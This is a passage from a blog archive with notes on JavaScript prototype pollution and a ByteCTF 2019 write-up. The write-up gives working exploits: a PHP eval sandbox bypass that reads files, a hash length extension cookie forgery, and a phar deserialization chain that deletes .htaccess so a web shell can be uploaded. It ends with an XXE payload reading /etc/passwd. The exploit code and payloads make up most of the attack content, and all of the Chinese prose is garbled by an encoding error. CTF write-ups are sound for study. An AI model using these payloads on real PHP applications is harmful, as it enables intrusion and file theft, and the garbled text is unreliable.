<p>å¾ˆå‹‰å¼ºçš„è‡ªå·±ç»™è‡ªå·±æ‰¾åˆ°ä¸€ä¸ªæ¯”å–»: cat.prototypeæ˜¯ä¸€ä¸ªå¯¹è±¡, æ¯”ä½œä»“åº“, ä»“åº“é‡Œé¢æœ‰æŒ‰ç…§ä¸€å®šé¡ºåºæ‘†æ”¾çš„è´§ç‰©, constructoræ˜¯åœ¨è¿™äº›è´§ç‰©çš„åŸºç¡€ä¸Šåšçš„ä¿®æ”¹, æ¯”å¦‚å¢åŠ ä»€ä¹ˆä¸œè¥¿å‡å»ä»€ä¹ˆä¸œè¥¿æ”¹å˜ä»€ä¹ˆä¸œè¥¿çš„é¡ºåºä¹‹ç±»çš„. æ²¡æœ‰constructor, ä»“åº“å°±æ˜¯é™æ€çš„ä¸€ä¸ªä»“åº“, ä¹Ÿå°±æ˜¯å¯¹è±¡, ä½†æ˜¯å¦‚æœå°†constructorå®æ–½çš„è¯, å°±æ˜¯äº§ç”Ÿä¸€ä¸ªæ‹¥æœ‰æ–°è´§ç‰©çš„ä»“åº“, ä¹Ÿå°±æ˜¯catå®ä¾‹å¯¹è±¡, é‚£ä¹ˆç±»åˆæ˜¯ä»€ä¹ˆæ¦‚å¿µ? å°±åƒæ˜¯ç»™ä»“åº“å®šä¸‹ä¸€ä¸ªæ•´ç†è®¡åˆ’, è¿™ä¸ªè®¡åˆ’å«åšconstructor, è€Œè¿™ä¸ªè®¡åˆ’è¿˜æ²¡æœ‰å®æ–½, ä½ è¯´ä»–æ˜¯é™æ€çš„ä»“åº“(å¯¹è±¡)ä¼¼ä¹ä¸å¦¥, å› ä¸ºæœ‰è®¡åˆ’çš„å­˜åœ¨, è¿™ä¸ªä»“åº“æ˜¯å¯å˜çš„, è¿™ä¸ªçŠ¶æ€å¯ä»¥å˜åŒ–çš„ä»“åº“å°±å«åšç±».</p>
<p>å½“ç„¶è¿™ç§æ¯”å–»å¾ˆç‰µå¼º, æˆ‘ä¹Ÿä¸çŸ¥é“åˆä¸åˆç†, ä¹Ÿåªæ˜¯ä¸ºäº†æ›´å¥½ç†è§£åŸå‹é“¾æ±¡æŸ“è€Œåšçš„è‡†æƒ³â€¦</p>
<p>ç„¶åå¯¹äºpå¸ˆå‚…åšå®¢ä¸­å†™é“å…³äºå­—å…¸èµ‹å€¼protoæ— æ•ˆçš„é—®é¢˜,å®éªŒäº†ä¸€ä¸‹:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/69007214-fc7b8b00-0975-11ea-9f53-bf96932750ea.png" alt="image"></p>
<p>å­—å…¸åœ¨åˆ›ç«‹çš„æ—¶å€™åº”è¯¥æ˜¯å…ˆåˆ›ç«‹å­—å…¸å†…çš„é¡¹ç„¶åå°†ä»–ä»¬èšåˆèµ·æ¥, é‚£ä¹ˆåœ¨åˆ›ç«‹açš„æ—¶å€™å…ˆåˆ›ç«‹çš„æ˜¯açš„åŸå‹, ç„¶åå†åˆ›ç«‹çš„a, è¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆbarä¼ ä¸åˆ°Objectä¸­å»,è€Œæ˜¯ä¼ å…¥äº†Objectçš„ä¸‹ä¸€çº§, ä¹Ÿå°±æ˜¯açš„åŸå‹</p>
]]></content>
  </entry>
  <entry>
    <title>bytectf2019</title>
    <url>/2019/09/09/bytectf2019-working/</url>
    <content><![CDATA[<h2 id="boring-code">boring code</h2>
<p>source code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ€è·¯: <a href="http://xn--xxxxbaidu-u75noof94aqu3g.com" target="_blank" rel="noopener">æ³¨å†Œä¸€ä¸ªxxxxbaidu.com</a> å½¢å¼çš„åŸŸå.ç»‘å®šåˆ°æœåŠ¡å™¨ä¸Šåæ”¾ä¸Šè‡ªå·±çš„ä»£ç ,payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸¤ä¸ªpayloadéƒ½å¾ˆç²¾å½©, æ¶‰åŠçš„çŸ¥è¯†ç‚¹å¦‚ä¸‹:</p>
<ul>
<li>
<p>crypt å‡½æ•°æ²¡æœ‰keyçš„æ—¶å€™éšæœºç”Ÿæˆkeyè¿›è¡ŒåŠ å¯†, å¦‚æœå¤šå°è¯•å‡ æ¬¡åŠ å¯†çš„è¯å°±ä¼šå‘ç°æœ‰å‡ æ¬¡çš„åŠ å¯†ç»“æœä¸­çš„æœ«å°¾æœ‰ç‚¹å·.</p>
</li>
<li>
<p>ordå‡½æ•°ä¼ å…¥å­—ç¬¦ä¸²çš„æ—¶å€™, åªè¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç </p>
</li>
<li>
<p>localeconvå‡½æ•°è¿”å›ä¸€ç»„åŒ…å«æœ¬åœ°æ•°å­—å’Œè´§å¸æ ¼å¼çš„æ•°ç»„, æ•°ç»„ç¬¬ä¸€ä½æ˜¯&quot;å°æ•°ç‚¹å­—ç¬¦&quot;,  ä¹Ÿå°±æ˜¯ç‚¹å·</p>
</li>
<li>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(localeconv());</span><br><span class="line">array(18) &#123;</span><br><span class="line">  [&quot;decimal_point&quot;]=&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [&quot;thousands_sep&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_curr_symbol&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;currency_symbol&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_decimal_point&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_thousands_sep&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;positive_sign&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;negative_sign&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_frac_digits&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;frac_digits&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_cs_precedes&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sep_by_space&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_cs_precedes&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_sep_by_space&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sign_posn&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_sign_posn&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;grouping&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;mon_grouping&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>pos() å‡½æ•°æ˜¯currentå‡½æ•°çš„åˆ«å</p>
</li>
<li>
<p>time() è¿”å›æ—¶é—´æˆ³æ•´æ•°, ä»ä¸­æ— æ³•æå‡ºç‚¹å·</p>
</li>
<li>
<p>localtimeç¬¬ä¸€å‚æ•°é»˜è®¤æ˜¯time(), ä¸èƒ½æ¥å—å¸ƒå°”å€¼ä¹Ÿå°±æ˜¯chdirçš„è¿”å›å€¼</p>
</li>
<li>
<p>localtime() è¿”å›æ•°ç»„æ¥è¡¨ç¤ºå½“å‰æ—¶é—´, ç¬¬ä¸€é¡¹æ˜¯å½“å‰çš„ç§’æ•°, è¦è®©chrè½¬æ¢æˆç‚¹å·çš„è¯å°±è¦åœ¨ç¬¬46ç§’æ‰§è¡Œ</p>
</li>
</ul>
<h2 id="ezCMS">ezCMS</h2>
<p>æºç <code>www.zip</code>, å…³é”®ä»£ç å¦‚ä¸‹:</p>
<p>èº«ä»½éªŒè¯éƒ¨åˆ†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function login()&#123;</span><br><span class="line">    $secret = &quot;********&quot;;</span><br><span class="line">    setcookie(&quot;hash&quot;, md5($secret.&quot;adminadmin&quot;));</span><br><span class="line">    return 1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function is_admin()&#123;</span><br><span class="line">    $secret = &quot;********&quot;;</span><br><span class="line">    $username = $_SESSION[&apos;username&apos;];</span><br><span class="line">    $password = $_SESSION[&apos;password&apos;];</span><br><span class="line">    if ($username == &quot;admin&quot; &amp;&amp; $password != &quot;admin&quot;)&#123;</span><br><span class="line">        if ($_COOKIE[&apos;user&apos;] === md5($secret.$username.$password))&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥æ˜æ˜¾çœ‹å‡ºè¿™é‡Œæœ‰å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡».</p>
<p>å“ˆå¸Œç”Ÿæˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./hash_extender -d &apos;admin&apos; -s 52107b08c0f3342d2153ae1d68e6262c -f md5 -a &apos;ch4ser&apos; --out-data-format=html -l 13 --quiet</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°äº†æ–°çš„å“ˆå¸Œå€¼,æ·»åŠ åˆ°cookie[user]ä¸­</p>
<p>ç„¶åæ–°çš„ç™»å½•ç”¨æˆ·å: admin</p>
<p>ç”¨æˆ·å¯†ç :admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00ch4ser</p>
<p>ç¬¬äºŒéƒ¨åˆ†ååºåˆ—åŒ–ä»£ç å®¡è®¡.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $black_list = [<span class="string">'system'</span>,<span class="string">'eval'</span>,<span class="string">'exec'</span>,<span class="string">'+'</span>,<span class="string">'passthru'</span>,<span class="string">'`'</span>,<span class="string">'assert'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">            <span class="keyword">if</span> (stripos($content, $v) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"your file make me scare"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $filepath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filepath = $filepath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span>, <span class="keyword">$this</span>-&gt;filepath))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"nonono~"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $mine = mime_content_type(<span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">        $store_path = <span class="keyword">$this</span>-&gt;open(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">        $res[<span class="string">'mine'</span>] = $mine;</span><br><span class="line">        $res[<span class="string">'store_path'</span>] = $store_path;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename, $filepath)</span></span>&#123;</span><br><span class="line">        $res = <span class="string">"$filename is in $filepath"</span>;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;checker))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;upload_file();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $size;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $file_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_dir;</span><br><span class="line">    <span class="keyword">public</span> $content_check;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $file_tmp, $size)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;upload_dir = <span class="string">'sandbox/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;upload_dir))&#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;upload_dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!is_file(<span class="keyword">$this</span>-&gt;upload_dir.<span class="string">'/.htaccess'</span>))&#123;</span><br><span class="line">            file_put_contents(<span class="keyword">$this</span>-&gt;upload_dir.<span class="string">'/.htaccess'</span>, <span class="string">'lolololol, i control all'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;size = $size;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_tmp = $file_tmp;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_check = <span class="keyword">new</span> Check(<span class="keyword">$this</span>-&gt;file_tmp);</span><br><span class="line">        $profile = <span class="keyword">new</span> Profile();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $profile-&gt;is_admin();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'u r not admin'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_check -&gt; check();</span><br><span class="line">        $tmp = explode(<span class="string">"."</span>, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $ext = end($tmp);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;size &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"your file is too big"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        move_uploaded_file(<span class="keyword">$this</span>-&gt;file_tmp, <span class="keyword">$this</span>-&gt;upload_dir.<span class="string">'/'</span>.md5(<span class="keyword">$this</span>-&gt;filename).<span class="string">'.'</span>.$ext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $_SESSION[<span class="string">'password'</span>];</span><br><span class="line">        $secret = <span class="string">"********"</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">"admin"</span> &amp;&amp; <span class="keyword">$this</span>-&gt;password != <span class="string">"admin"</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> ($_COOKIE[<span class="string">'user'</span>] === md5($secret.<span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin-&gt;open(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨é“¾:</p>
<ul>
<li>ä¸Šä¼ exp.phar</li>
<li>ç»•è¿‡wafä½¿ç”¨<code>php://filter/read=convert.base64-encode/resource=phar://exp.phar</code>è§¦å‘pharè®©ä»–ååºåˆ—ä¸­fileç±»çš„destruct, upload_fileè§¦å‘profileçš„__callå‡½æ•°, è§¦å‘openå‡½æ•°</li>
<li>profile-&gt;adminå£°æ˜ä¸ºZipArchiveç±», åˆ©ç”¨è¿™ä¸ªåŸç”Ÿç±»çš„åŒåå‡½æ•°openæ¥åˆ é™¤åŸæœ‰çš„.htaccess, åˆ é™¤å®Œä¹‹åå†ä¼ ä¸€ä¸ªshellå°±å¯ä»¥äº†</li>
</ul>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Admin();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $size;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $file_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_dir;</span><br><span class="line">    <span class="keyword">public</span> $file_error;</span><br><span class="line">    <span class="keyword">public</span> $content_check;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;size = <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_check = <span class="keyword">new</span> Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">"/var/www/html/sandbox/76c98b2e4f0f7a9a467bcf459b36ab5c/.htaccess"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = ZipArchive::OVERWRITE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"exp.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exp.phar'</span>);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> File();</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>
<p>shell.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&apos;/flag&apos;);</span><br></pre></td></tr></table></figure>
<h2 id="rss">rss</h2>
<p>data protocol format:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</span><br></pre></td></tr></table></figure>
<p>è¯´æ˜¯phpå¯¹mine typeä¸æ•æ„Ÿ, é‚£ä¹ˆå¯ä»¥è¿™æ ·å­å†™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data://baidu.com/plain;base64,xxxxxxxxx==</span><br></pre></td></tr></table></figure>
<p>ç„¶åçœ‹rssçš„å®šä¹‰:</p>
<blockquote>
<p>What is RSS?</p>
<p>It is a format to share data, defined in the <a href="https://www.xul.fr/en-xml.php" target="_blank" rel="noopener">1.0 version</a> of XML. You can deliver information in this format et one can get this information, and information from other various sources, in this format. Information provided by a website in an XML file is called an RSS feed.<br>
Recent browsers can read directly RSS files, but a special <strong>RSS reader</strong> or <strong>aggregator</strong> may be used too.</p>
</blockquote>
<p>æ‰€ä»¥æ‰€è°“çš„rsså°±æ˜¯xml.</p>
<p>å°è¯•æµ‹è¯•</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns:atom</span>=<span class="string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The Blog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>A blog about things<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>a post<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>author@example.com<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å°†ä¸Šè¿°å†…å®¹base64ç¼–ç ä¹‹åç”¨ä¹‹å‰çš„dataåè®®ä¼ å…¥è¿›å», è§¦å‘æˆåŠŸ.</p>
